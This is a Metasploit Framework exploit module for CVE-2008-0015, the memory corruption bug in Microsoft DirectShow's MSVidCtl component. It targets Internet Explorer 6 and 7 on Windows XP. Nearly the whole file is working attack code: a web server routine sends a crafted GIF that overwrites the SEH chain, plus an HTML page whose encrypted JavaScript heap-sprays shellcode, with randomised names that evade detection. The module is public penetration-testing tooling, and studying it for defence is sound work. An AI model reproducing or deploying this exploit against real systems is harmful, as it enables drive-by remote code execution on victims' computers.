##
# $Id: msvidctl_mpeg2.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# msvidctl_mpeg2.rb
#
# Microsoft DirectShow (msvidctl.dll) MPEG-2 Memory Corruption exploit for the Metasploit Framework
#
# Tested successfully on the following platforms (fully patched 06/07/09):
#  - Internet Explorer 6, Windows XP SP2
#  - Internet Explorer 7, Windows XP SP3
#
# Original exploit was found in-the-wild used to preform drive-by attacks via compromised Chinese web sites.
# The original exploit can be found here (shellcode changed to execute calc.exe):
# http://www.rec-sec.com/exploits/aa.rar
#
# Trancer
# http://www.rec-sec.com
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft DirectShow (msvidctl.dll) MPEG-2 Memory Corruption',
			'Description'    => %q{
					This module exploits a memory corruption within the MSVidCtl component of Microsoft
				DirectShow (BDATuner.MPEG2TuneRequest).
				By loading a specially crafted GIF file, an attacker can overrun a buffer and
				execute arbitrary code.

				ClassID is now configurable via an advanced option (otherwise randomized) - I)ruid
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'Trancer <mtrancer[at]gmail.com>' ],
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2008-0015' ],
					[ 'OSVDB', '55651' ],
					[ 'BID', '35558' ],
					[ 'MSB', 'MS09-032' ],
					[ 'MSB', 'MS09-037' ],
					[ 'URL', 'http://www.microsoft.com/technet/security/advisory/972890.mspx' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0-SP3 / IE 6.0 SP0-2 & IE 7.0', { 'Ret' => 0x0C0C0C0C } ]
				],
			'DisclosureDate' => 'Jul 05 2009',
			'DefaultTarget'  => 0))

		register_advanced_options(
			[
				OptString.new('ClassID', [ false, "Specific ClassID to use (otherwise randomized)", nil ]),
			], self.class)

		@javascript_encode_key = rand_text_alpha(rand(10) + 10)
	end

	def on_request_uri(cli, request)

		if (request.uri.match(/\.gif$/i))

			print_status("Sending GIF to #{cli.peerhost}:#{cli.peerport}...")

			gif =  "\x00\x03\x00\x00\x11\x20\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			gif << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			gif << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			gif << "\xFF\xFF\xFF\xFF"	# End of SEH chain
			gif << [target.ret].pack('V')	# SE Handler
			gif << "\x00"

			send_response(cli, gif, { 'Content-Type' => 'image/gif' })

			return
		end

		if (!request.uri.match(/\?\w+/))
			send_local_redirect(cli, "?#{@javascript_encode_key}")
			return
		end

		print_status("Sending HTML to #{cli.peerhost}:#{cli.peerport}...")

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Class IDs
		allclsids = [ # all IDs from the advisory
			"011B3619-FE63-4814-8A84-15A194CE9CE3", # doesn't work
			"0149EEDF-D08F-4142-8D73-D23903D21E90", # doesn't work
			"0369B4E5-45B6-11D3-B650-00C04F79498E", # works
			"0369B4E6-45B6-11D3-B650-00C04F79498E", # works
			"055CB2D7-2969-45CD-914B-76890722F112", # works
			"0955AC62-BF2E-4CBA-A2B9-A63F772D46CF", # works
			"15D6504A-5494-499C-886C-973C9E53B9F1", # works
			"1BE49F30-0E1B-11D3-9D8E-00C04F72D980", # doesn't work
			"1C15D484-911D-11D2-B632-00C04F79498E", # doesn't work
			"1DF7D126-4050-47F0-A7CF-4C4CA9241333", # doesn't work
			"2C63E4EB-4CEA-41B8-919C-E947EA19A77C", # doesn't work
			"334125C0-77E5-11D3-B653-00C04F79498E", # doesn't work
			"37B0353C-A4C8-11D2-B634-00C04F79498E", # doesn't work
			"37B03543-A4C8-11D2-B634-00C04F79498E", # doesn't work
			"37B03544-A4C8-11D2-B634-00C04F79498E", # doesn't work
			"418008F3-CF67-4668-9628-10DC52BE1D08", # doesn't work
			"4A5869CF-929D-4040-AE03-FCAFC5B9CD42", # doesn't work
			"577FAA18-4518-445E-8F70-1473F8CF4BA4", # doesn't work
			"59DC47A8-116C-11D3-9D8E-00C04F72D980", # works
			"7F9CB14D-48E4-43B6-9346-1AEBC39C64D3", # doesn't work
			"823535A0-0318-11D3-9D8E-00C04F72D980", # doesn't work
			"8872FF1B-98FA-4D7A-8D93-C9F1055F85BB", # doesn't work
			"8A674B4C-1F63-11D3-B64C-00C04F79498E", # works
			"8A674B4D-1F63-11D3-B64C-00C04F79498E", # works
			"9CD64701-BDF3-4D14-8E03-F12983D86664", # doesn't work
			"9E77AAC4-35E5-42A1-BDC2-8F3FF399847C", # doesn't work
			"A1A2B1C4-0E3A-11D3-9D8E-00C04F72D980", # doesn't work
			"A2E3074E-6C3D-11D3-B653-00C04F79498E", # doesn't work
			"A2E30750-6C3D-11D3-B653-00C04F79498E", # works
			"A8DCF3D5-0780-4EF4-8A83-2CFFAACB8ACE", # doesn't work
			"AD8E510D-217F-409B-8076-29C5E73B98E8", # doesn't work
			"B0EDF163-910A-11D2-B632-00C04F79498E", # doesn't work
			"B64016F3-C9A2-4066-96F0-BD9563314726", # works
			"BB530C63-D9DF-4B49-9439-63453962E598", # doesn't work
			"C531D9FD-9685-4028-8B68-6E1232079F1E", # doesn't work
			"C5702CCC-9B79-11D3-B654-00C04F79498E", # doesn't work
			"C5702CCD-9B79-11D3-B654-00C04F79498E", # doesn't work
			"C5702CCE-9B79-11D3-B654-00C04F79498E", # doesn't work
			"C5702CCF-9B79-11D3-B654-00C04F79498E", # doesn't work
			"C5702CD0-9B79-11D3-B654-00C04F79498E", # doesn't work
			"C6B14B32-76AA-4A86-A7AC-5C79AAF58DA7", # works
			"CAAFDD83-CEFC-4E3D-BA03-175F17A24F91", # doesn't work
			"D02AAC50-027E-11D3-9D8E-00C04F72D980", # doesn't work
			"F9769A06-7ACA-4E39-9CFB-97BB35F0E77E", # works
			"FA7C375B-66A7-4280-879D-FD459C84BB02", # doesn't work
		]
		clsids = [ # these all work
			"0369B4E5-45B6-11D3-B650-00C04F79498E", # works
			"0369B4E6-45B6-11D3-B650-00C04F79498E", # works
			"055CB2D7-2969-45CD-914B-76890722F112", # works
			"0955AC62-BF2E-4CBA-A2B9-A63F772D46CF", # works
			"15D6504A-5494-499C-886C-973C9E53B9F1", # works
			"59DC47A8-116C-11D3-9D8E-00C04F72D980", # works
			"8A674B4C-1F63-11D3-B64C-00C04F79498E", # works
			"8A674B4D-1F63-11D3-B64C-00C04F79498E", # works
			"A2E30750-6C3D-11D3-B653-00C04F79498E", # works
			"B64016F3-C9A2-4066-96F0-BD9563314726", # works
			"C6B14B32-76AA-4A86-A7AC-5C79AAF58DA7", # works
			"F9769A06-7ACA-4E39-9CFB-97BB35F0E77E", # works
		]
		classid = datastore['ClassID'] || clsids[rand(clsids.size)]

		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Setup exploit buffers
		nops 	  = Rex::Text.to_unescape([target.ret].pack('V'))
		blocksize = 0x40000
		fillto    = 500

		# Randomize the javascript variable names
		msvidctl     = rand_text_alpha(rand(100) + 1)
		div	     = rand_text_alpha(rand(100) + 1)
		j_shellcode  = rand_text_alpha(rand(100) + 1)
		j_nops       = rand_text_alpha(rand(100) + 1)
		j_headersize = rand_text_alpha(rand(100) + 1)
		j_slackspace = rand_text_alpha(rand(100) + 1)
		j_fillblock  = rand_text_alpha(rand(100) + 1)
		j_block      = rand_text_alpha(rand(100) + 1)
		j_memory     = rand_text_alpha(rand(100) + 1)
		j_counter    = rand_text_alpha(rand(30) + 2)

		host = Rex::Socket.source_address(cli.peerhost) + ":" + datastore["SRVPORT"]
		gif_uri = "http#{(datastore['SSL'] ? 's' : '')}://#{host}"
		if ("/" == get_resource[-1,1])
			gif_uri << get_resource[0, get_resource.length - 1]
		else
			gif_uri << get_resource
		end
		gif_uri << "/" + Time.now.to_i.to_s + ".gif"

		js = %Q|#{j_shellcode}=unescape('#{shellcode}');
#{j_nops}=unescape('#{nops}');
#{j_headersize}=20;
#{j_slackspace}=#{j_headersize}+#{j_shellcode}.length;
while(#{j_nops}.length<#{j_slackspace})#{j_nops}+=#{j_nops};
#{j_fillblock}=#{j_nops}.substring(0,#{j_slackspace});
#{j_block}=#{j_nops}.substring(0,#{j_nops}.length-#{j_slackspace});
while(#{j_block}.length+#{j_slackspace}<#{blocksize})#{j_block}=#{j_block}+#{j_block}+#{j_fillblock};
#{j_memory}=new Array();
for(#{j_counter}=0;#{j_counter}<#{fillto};#{j_counter}++)#{j_memory}[#{j_counter}]=#{j_block}+#{j_shellcode};

var #{msvidctl}=document.createElement('object');
#{div}.appendChild(#{msvidctl});
#{msvidctl}.width='1';
#{msvidctl}.height='1';
#{msvidctl}.data='#{gif_uri}';
#{msvidctl}.classid='clsid:#{classid}';|

		js_encoded = encrypt_js(js, @javascript_encode_key)

		html = %Q|<html>
<body>
<div id="#{div}">
<script>
#{js_encoded}
</script>
</body>
</html>|

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response(cli, html, { 'Content-Type' => 'text/html' })

		# Handle the payload
		handler(cli)
	end

end
